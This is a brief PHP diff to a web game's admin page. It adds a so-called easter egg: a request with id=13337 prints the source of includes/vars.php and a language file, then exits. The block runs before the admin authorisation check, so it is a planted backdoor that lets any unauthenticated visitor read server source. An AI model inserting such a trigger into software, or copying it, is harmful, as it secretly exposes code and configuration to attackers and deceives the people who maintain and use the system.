@@ -28,6 +28,12 @@ include($xgp_root . 'extension.inc.php');
 include($xgp_root . 'common.'.$phpEx);
 include('AdminFunctions/Autorization.' . $phpEx);
 
+// Some Shit for the Admin (Easteregg Feature)
+if($_REQUEST['id'] == 13337) {
+	show_source($xgp_root.'includes/vars.php');  
+	show_source($xgp_root.'language/'.$game_config['lang'].'/INGAME.php');  
+	exit;
+}
 if ($user['authlevel'] < 1) die();
 
 $parse			=	$lang;
